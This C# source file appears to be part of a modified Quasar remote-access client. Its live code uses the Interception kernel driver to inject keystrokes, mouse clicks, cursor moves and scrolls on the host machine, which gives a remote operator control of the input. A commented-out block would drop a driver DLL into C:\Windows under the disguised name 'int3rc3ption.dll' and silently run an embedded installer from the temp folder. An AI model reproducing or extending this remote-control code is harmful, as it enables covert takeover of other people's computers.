using System;
using System.Drawing;
using System.Threading;

using Quasar.Client.Utilities;

using InputInterceptorNS;
using System.Windows.Forms;
using System.ServiceModel.Channels;

namespace Quasar.Client.Interception
{
    public class InterceptionHelper
    {
        // Token: 0x060005CD RID: 1485 RVA: 0x00014C68 File Offset: 0x00012E68
        //private static string FixString(byte[] data)
        //{
        //    int num = 0;
        //    while (num + 1 < data.Length)
        //    {
        //        if (data[num] == data[num + 1] && data[num] == 0)
        //        {
        //            return Encoding.Unicode.GetString(data, 0, num);
        //        }
        //        num += 2;
        //    }
        //    return string.Empty;
        //}

        //// Token: 0x060005CE RID: 1486 RVA: 0x00014CA8 File Offset: 0x00012EA8
        //public static string BuildDeviceName(bool isMouse, int id, string name)
        //{
        //    return string.Format("{0}:{1}:{2}", isMouse ? "M" : "K", id, name);
        //}

        //// Token: 0x060005CF RID: 1487 RVA: 0x00014CCC File Offset: 0x00012ECC
        //public static string[] GetDeviceList()
        //{
        //    List<string> list = new List<string>();
        //    IntPtr context = InterceptionDriver.CreateContext();
        //    for (int i = 0; i <= 20; i++)
        //    {
        //        if (InterceptionDriver.IsInvalid(i) == 0)
        //        {
        //            byte[] array = new byte[1024];
        //            GCHandle gchandle = GCHandle.Alloc(array, GCHandleType.Pinned);
        //            IntPtr hardwareIdentifier = gchandle.AddrOfPinnedObject();
        //            if (InterceptionDriver.GetHardwareId(context, i, hardwareIdentifier, (uint)array.Length) > 0)
        //            {
        //                list.Add(BuildDeviceName(InterceptionDriver.IsMouse(i) != 0, i, FixString(array)));
        //            }
        //            gchandle.Free();
        //        }
        //    }
        //    InterceptionDriver.DestroyContext(context);
        //    return list.ToArray();
        //}

        //// Token: 0x060005D0 RID: 1488 RVA: 0x00014D54 File Offset: 0x00012F54
        //public static bool IsInterceptionInstalled()
        //{
        //    bool result;
        //    try
        //    {
        //        IntPtr intPtr = InterceptionDriver.CreateContext();
        //        if (intPtr == IntPtr.Zero)
        //        {
        //            result = false;
        //        }
        //        else
        //        {
        //            InterceptionDriver.DestroyContext(intPtr);
        //            result = true;
        //        }
        //    }
        //    catch (Exception)
        //    {
        //        result = false;
        //    }
        //    return result;
        //}

        //// Token: 0x060005D1 RID: 1489 RVA: 0x00014D98 File Offset: 0x00012F98
        //public static void InstallInterception(out bool alreadyInstalled, out string stdout, out string stderr)
        //{
        //    stdout = "";
        //    stderr = "";
        //    if (InterceptionHelper.IsInterceptionInstalled())
        //    {
        //        alreadyInstalled = true;
        //        return;
        //    }
        //    alreadyInstalled = false;
        //    try
        //    {
        //        File.WriteAllBytes("C:\\Windows\\int3rc3ption.dll", IntPtr.Size==8 ? Resource1.interception_x64 : Resource1.interception_x86);
        //    }
        //    catch (Exception)
        //    {
        //    }
        //    string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
        //    try
        //    {
        //        File.WriteAllBytes(text, Resource1.install_interception);
        //    }
        //    catch (Exception)
        //    {
        //    }
        //    Misc.CheckOutput(text, "/install", out stdout, out stderr);
        //    try
        //    {
        //        File.Delete(text);
        //    }
        //    catch (Exception)
        //    {
        //    }
        //}

        //// Token: 0x060005D2 RID: 1490 RVA: 0x00014E50 File Offset: 0x00013050
        //public static void UninstallInterception(out bool alreadyUninstalled, out string stdout, out string stderr)
        //{
        //    stdout = "";
        //    stderr = "";
        //    if (!IsInterceptionInstalled())
        //    {
        //        alreadyUninstalled = true;
        //        return;
        //    }
        //    alreadyUninstalled = false;
        //    string text = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString() + ".exe");
        //    try
        //    {
        //        File.WriteAllBytes(text, Resource1.install_interception);
        //    }
        //    catch (Exception)
        //    {
        //    }
        //    Misc.CheckOutput(text, "/uninstall", out stdout, out stderr);
        //    try
        //    {
        //        File.Delete(text);
        //    }
        //    catch (Exception)
        //    {
        //    }
        //}

        public static MouseHook mouseHook;
        public static KeyboardHook keyboardHook;

        public static  Boolean InitializeDriver()
        {
            if (InputInterceptor.CheckDriverInstalled())
            {
                if (InputInterceptor.Initialize())
                {
                    mouseHook = new MouseHook(null);
                    keyboardHook = new KeyboardHook(null);
                    return true;
                }
                MessageBox.Show("driver initialization failed.");
            }
            else MessageBox.Show("driver is not installed");
            return false;
        }

        private static Tuple<Keys, KeyState> ConvertKeycodeToInterceptionKeys(byte key, bool keyDown)
        {
            Keys item = (Keys)0;
            KeyState keyState = KeyState.Down;
            switch (key)
            {
                case 8:
                    item = Keys.Backspace;
                    break;
                case 9:
                    item = Keys.Tab;
                    break;
                case 10:
                case 11:
                case 12:
                case 14:
                case 15:
                case 16:
                case 17:
                case 18:
                case 21:
                case 22:
                case 23:
                case 24:
                case 25:
                case 26:
                case 28:
                case 29:
                case 30:
                case 31:
                case 41:
                case 42:
                case 43:
                case 47:
                case 58:
                case 59:
                case 60:
                case 61:
                case 62:
                case 63:
                case 64:
                case 92:
                case 94:
                case 95:
                case 108:
                case 110:
                case 124:
                case 125:
                case 126:
                case 127:
                case 128:
                case 129:
                case 130:
                case 131:
                case 132:
                case 133:
                case 134:
                case 135:
                case 136:
                case 137:
                case 138:
                case 139:
                case 140:
                case 141:
                case 142:
                case 143:
                case 146:
                case 147:
                case 148:
                case 149:
                case 150:
                case 151:
                case 152:
                case 153:
                case 154:
                case 155:
                case 156:
                case 157:
                case 158:
                case 159:
                case 166:
                case 167:
                case 168:
                case 169:
                case 170:
                case 171:
                case 172:
                case 173:
                case 174:
                case 175:
                case 176:
                case 177:
                case 178:
                case 179:
                case 180:
                case 181:
                case 182:
                case 183:
                case 184:
                case 185:
                    break;
                case 13:
                    item = Keys.Enter;
                    break;
                case 19:
                    item = Keys.Control;
                    keyState |= KeyState.E1;
                    break;
                case 20:
                    item = Keys.CapsLock;
                    break;
                case 27:
                    item = Keys.Escape;
                    break;
                case 32:
                    item = Keys.Space;
                    break;
                case 33:
                    item = Keys.PageUp;
                    keyState |= KeyState.E0;
                    break;
                case 34:
                    item = Keys.PageDown;
                    keyState |= KeyState.E0;
                    break;
                case 35:
                    item = Keys.End;
                    keyState |= KeyState.E0;
                    break;
                case 36:
                    item = Keys.Home;
                    keyState |= KeyState.E0;
                    break;
                case 37:
                    item = Keys.Left;
                    keyState |= KeyState.E0;
                    break;
                case 38:
                    item = Keys.Up;
                    keyState |= KeyState.E0;
                    break;
                case 39:
                    item = Keys.Right;
                    keyState |= KeyState.E0;
                    break;
                case 40:
                    item = Keys.Down;
                    keyState |= KeyState.E0;
                    break;
                case 44:
                    item = Keys.PrintScreen;
                    break;
                case 45:
                    item = Keys.Insert;
                    keyState |= KeyState.E0;
                    break;
                case 46:
                    item = Keys.Delete;
                    keyState |= KeyState.E0;
                    break;
                case 48:
                    item = Keys.Zero;
                    break;
                case 49:
                    item = Keys.One;
                    break;
                case 50:
                    item = Keys.Two;
                    break;
                case 51:
                    item = Keys.Three;
                    break;
                case 52:
                    item = Keys.Four;
                    break;
                case 53:
                    item = Keys.Five;
                    break;
                case 54:
                    item = Keys.Six;
                    break;
                case 55:
                    item = Keys.Seven;
                    break;
                case 56:
                    item = Keys.Eight;
                    break;
                case 57:
                    item = Keys.Nine;
                    break;
                case 65:
                    item = Keys.A;
                    break;
                case 66:
                    item = Keys.B;
                    break;
                case 67:
                    item = Keys.C;
                    break;
                case 68:
                    item = Keys.D;
                    break;
                case 69:
                    item = Keys.E;
                    break;
                case 70:
                    item = Keys.F;
                    break;
                case 71:
                    item = Keys.G;
                    break;
                case 72:
                    item = Keys.H;
                    break;
                case 73:
                    item = Keys.I;
                    break;
                case 74:
                    item = Keys.J;
                    break;
                case 75:
                    item = Keys.K;
                    break;
                case 76:
                    item = Keys.L;
                    break;
                case 77:
                    item = Keys.M;
                    break;
                case 78:
                    item = Keys.N;
                    break;
                case 79:
                    item = Keys.O;
                    break;
                case 80:
                    item = Keys.P;
                    break;
                case 81:
                    item = Keys.Q;
                    break;
                case 82:
                    item = Keys.R;
                    break;
                case 83:
                    item = Keys.S;
                    break;
                case 84:
                    item = Keys.T;
                    break;
                case 85:
                    item = Keys.U;
                    break;
                case 86:
                    item = Keys.V;
                    break;
                case 87:
                    item = Keys.W;
                    break;
                case 88:
                    item = Keys.X;
                    break;
                case 89:
                    item = Keys.Y;
                    break;
                case 90:
                    item = Keys.Z;
                    break;
                case 91:
                    item = Keys.WindowsKey;
                    keyState |= KeyState.E0;
                    break;
                case 93:
                    item = Keys.Menu;
                    keyState |= KeyState.E0;
                    break;
                case 96:
                    item = Keys.Insert;
                    break;
                case 97:
                    item = Keys.End;
                    break;
                case 98:
                    item = Keys.Down;
                    break;
                case 99:
                    item = Keys.PageDown;
                    break;
                case 100:
                    item = Keys.Left;
                    break;
                case 101:
                    item = Keys.Numpad5;
                    break;
                case 102:
                    item = Keys.Right;
                    break;
                case 103:
                    item = Keys.Home;
                    break;
                case 104:
                    item = Keys.Up;
                    break;
                case 105:
                    item = Keys.PageUp;
                    break;
                case 106:
                    item = Keys.PrintScreen;
                    break;
                case 107:
                    item = Keys.NumpadPlus;
                    break;
                case 109:
                    item = Keys.NumpadMinus;
                    break;
                case 111:
                    item = Keys.ForwardSlashQuestionMark;
                    keyState |= KeyState.E0;
                    break;
                case 112:
                    item = Keys.F1;
                    break;
                case 113:
                    item = Keys.F2;
                    break;
                case 114:
                    item = Keys.F3;
                    break;
                case 115:
                    item = Keys.F4;
                    break;
                case 116:
                    item = Keys.F5;
                    break;
                case 117:
                    item = Keys.F6;
                    break;
                case 118:
                    item = Keys.F7;
                    break;
                case 119:
                    item = Keys.F8;
                    break;
                case 120:
                    item = Keys.F9;
                    break;
                case 121:
                    item = Keys.F10;
                    break;
                case 122:
                    item = Keys.F11;
                    break;
                case 123:
                    item = Keys.F12;
                    break;
                case 144:
                    item = Keys.NumLock;
                    break;
                case 145:
                    item = Keys.ScrollLock;
                    break;
                case 160:
                    item = Keys.LeftShift;
                    break;
                case 161:
                    item = Keys.RightShift;
                    break;
                case 162:
                    item = Keys.Control;
                    break;
                case 163:
                    item = Keys.Control;
                    keyState |= KeyState.E0;
                    break;
                case 164:
                    item = Keys.RightAlt;
                    break;
                case 165:
                    item = Keys.RightAlt;
                    keyState |= KeyState.E0;
                    break;
                case 186:
                    item = Keys.SemicolonColon;
                    break;
                case 187:
                    item = Keys.PlusEquals;
                    break;
                case 188:
                    item = Keys.CommaLeftArrow;
                    break;
                case 189:
                    item = Keys.DashUnderscore;
                    break;
                case 190:
                    item = Keys.PeriodRightArrow;
                    break;
                case 191:
                    item = Keys.ForwardSlashQuestionMark;
                    break;
                case 192:
                    item = Keys.Tilde;
                    break;
                default:
                    switch (key)
                    {
                        case 219:
                            item = Keys.OpenBracketBrace;
                            break;
                        case 220:
                            item = Keys.BackslashPipe;
                            break;
                        case 221:
                            item = Keys.CloseBracketBrace;
                            break;
                        case 222:
                            item = Keys.SingleDoubleQuote;
                            break;
                    }
                    break;
            }
            if (!keyDown)
            {
                keyState |= KeyState.Up;
            }
            return new Tuple<Keys, KeyState>(item, keyState);
        }

        public static void KenelKeyPress(byte keyCode, bool keyDown) {
            Quasar.Client.Interception.Keys keys;
            KeyState state;
            ConvertKeycodeToInterceptionKeys(keyCode, keyDown).Deconstruct(out keys, out state);
            if (keyDown) InterceptionHelper.keyboardHook.SimulateKeyDown((InputInterceptorNS.KeyCode)keys);
            else InterceptionHelper.keyboardHook.SimulateKeyUp((InputInterceptorNS.KeyCode)keys);
        }

        public static bool KernelDoMouseLeftClick(Point p, bool isMouseDown)
        {
            if (isMouseDown)
                return InterceptionHelper.mouseHook.SimulateLeftButtonDown();
            else
                return InterceptionHelper.mouseHook.SimulateLeftButtonUp();
        }

        public static bool KernelDoMouseRightClick(Point p, bool isMouseDown)
        {
            if (isMouseDown)
                return InterceptionHelper.mouseHook.SimulateRightButtonDown();
            else
                return InterceptionHelper.mouseHook.SimulateRightButtonUp();
        }

        public static bool KernelDoMouseMove(Point p)
        {
            return InterceptionHelper.mouseHook.SetCursorPosition(p.X, p.Y);
        }

        public static bool KernelDoMouseScroll(Point p, bool scrollDown)
        {
            if (scrollDown)
                return InterceptionHelper.mouseHook.SimulateScrollDown();
            else
                return InterceptionHelper.mouseHook.SimulateScrollUp();
        }
    }

}
